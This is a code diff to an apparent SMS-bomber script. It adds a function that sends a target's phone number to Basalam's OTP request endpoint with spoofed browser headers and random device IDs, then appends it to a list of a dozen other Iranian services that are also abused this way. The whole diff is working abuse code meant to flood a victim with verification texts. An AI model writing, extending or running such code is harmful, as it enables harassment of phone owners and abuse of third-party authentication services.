@@ -218,13 +218,37 @@ def vakiljo(phone):
         print(f"Error: {e}")
         return False
 
+def basalam(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    
+    url = "https://services.basalam.com/web/v1/auth/captcha/otp-request"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Content-Type": "application/json",
+        "X-Client-Info": json.dumps({
+            "version": "4.1.54", "project": "charsou", "platform": "web", 
+            "name": "web.public", "deviceId": str(uuid.uuid4()), "sessionId": str(uuid.uuid4())
+        })
+    }
+    data = {"mobile": phone, "client_id": "11", "login_by_backup_mobile": False}
+
+    try:
+        r = requests.post(url, headers=headers, json=data, timeout=5)
+        print(f"[{'✔' if r.status_code == 200 else '✘'}] Basalam: {r.status_code} - {r.text}")
+        return r.status_code == 200
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return False
+
+
+
 
 
 # ==========================
 # لیست سرویس‌ها
 # ==========================
 services = [
-    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin, vakiljo
+    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin, vakiljo, basalam
 ]
 
 # ==========================
